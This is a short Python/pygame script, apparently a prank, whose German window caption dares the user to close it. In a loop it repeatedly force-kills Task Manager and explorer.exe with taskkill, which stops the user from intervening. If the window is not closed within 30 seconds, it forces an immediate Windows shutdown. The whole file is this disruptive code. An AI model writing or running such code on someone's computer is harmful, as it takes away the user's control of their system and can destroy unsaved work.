import pygame
import os
import time

pygame.init()
width = 0
height = 0
zeit = 0

pygame.display.set_mode((width, height))
pygame.display.set_caption("Versuche das Fenster zu schließen")

run = True
while run:
    os.system("cls")
    os.system("taskkill /F /IM Taskmgr.exe")
    os.system("taskkill /F /IM explorer.exe")
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            os.system("start explorer.exe")
            run = False
    time.sleep(1)
    zeit += 1
    print(zeit)
    if zeit == 30:
        run = False
        os.system("shutdown -s -t 0")
pygame.quit()